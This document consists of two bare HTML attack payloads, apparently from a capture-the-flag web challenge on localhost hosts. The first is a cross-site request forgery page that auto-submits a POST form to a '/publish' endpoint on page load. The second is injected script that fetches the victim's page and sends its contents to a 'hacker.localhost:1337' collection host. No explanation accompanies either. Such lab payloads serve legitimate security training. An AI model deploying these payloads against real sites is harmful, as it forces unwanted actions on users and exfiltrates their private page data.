```html
<html>
<body>
    <form action=http://challenge.localhost:80/publish method=post>
        <input type=submit value=csrf>
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

```html
<script>
fetch('/')
    .then(resp => resp.text())
    .then(text => 
        fetch("http://hacker.localhost:1337/", {
            method: "POST",
            body: text
        }))
</script>
```